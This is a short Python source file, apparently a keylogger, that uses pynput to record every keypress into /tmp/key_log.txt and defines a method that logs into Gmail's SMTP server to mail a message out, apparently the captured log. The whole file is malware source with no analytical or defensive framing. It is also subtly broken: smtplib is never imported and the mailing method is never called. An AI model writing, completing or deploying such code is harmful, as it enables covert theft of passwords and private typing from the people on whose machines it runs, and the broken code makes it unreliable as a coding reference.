from pynput.keyboard import Key, Listener
import logging

file_path = '/tmp/key_log.txt'


class Keylogger:
    email = ''
    password = ''

    def send_email(self, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()
    
    def merge_log(self, key):
        current_key = getattr(key,'char','*'+key.name+'*')
        with open(file_path, 'a') as f:
            f.write(current_key) 
    
    def main(self):
        with Listener(on_press=self.merge_log) as listener:
            listener.join()
